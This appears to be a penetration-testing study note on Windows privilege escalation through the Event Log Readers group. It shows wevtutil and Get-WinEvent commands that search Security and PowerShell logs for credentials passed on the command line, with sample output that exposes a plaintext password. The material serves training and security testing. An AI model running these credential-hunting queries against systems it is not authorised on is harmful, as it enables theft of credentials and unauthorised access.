# Event Log Readers — Windows PrivEsc

## Background: Process Creation Auditing
- If enabled, process creation + command-line values are logged as **Event ID 4688**: "A new process has been created."
- Used by defenders to spot malicious behavior via SIEM/ElasticSearch ingestion (e.g. `whoami`, `netstat`, `tasklist` run from an unexpected workstation like a marketing exec's machine).
- Common attacker command categories flagged by this logging:
  - **Post-access recon:** `tasklist`, `ver`, `ipconfig`, `systeminfo`
  - **Further recon:** `dir`, `net view`, `ping`, `net use`, `type`
  - **Malware spreading:** `at`, `reg`, `wmic`, `wusa`
- Orgs with tight budgets can pair this logging with fine-tuned **AppLocker** rules for high-impact, low-cost detection — a viable alternative when enterprise EDR is out of reach.

> Real-world anecdote: a small-security-team org (no EDR, but with command-line auditing enabled) detected and contained a pentester's teammate simply from running `tasklist` on a finance workstation.

**Key implication for attackers:** commands that pass **passwords as parameters** (e.g. `net use ... /user:x password`) get logged in full if this auditing is active — a juicy read for anyone who can access the log.

---

## Event Log Readers Group

- **Administrators** and members of **Event Log Readers** can read the Security event log.
- Orgs may add power users/developers to this group for specific tasks without granting full admin rights.

### Confirm Group Membership
```cmd
net localgroup "Event Log Readers"
```
```
Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members
-------
logger
```

---

## Querying Logs for Leaked Credentials

### Using wevtutil (search for `/user` in command lines)
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
```
Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

**With alternate credentials (remote target):**
```cmd
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

### Using Get-WinEvent (filter Event ID 4688 for `/user`)
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
```
CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

> ⚠️ **Important limitation:** `Get-WinEvent` against the **Security** log requires **Administrator** access, or adjusted permissions on `HKLM\System\CurrentControlSet\Services\Eventlog\Security` — membership in **Event Log Readers alone is not sufficient** for this cmdlet.

- `Get-WinEvent` also supports the `-Credential` parameter to run as another user.

---

## Other Logs Worth Checking

- **PowerShell Operational log** — may contain sensitive info/credentials if **script block logging** or **module logging** is enabled.
- Unlike the Security log, this one is **accessible to unprivileged users** by default — no special group membership needed.

---

## Key Takeaway
The Event Log Readers group (or the PowerShell Operational log for any unprivileged user) can expose **credentials passed as command-line arguments** in logged process creation events. Search for patterns like `/user`, `password`, `pass=`, etc. across accessible logs — a low-effort, high-value credential-hunting technique when process command-line auditing is enabled.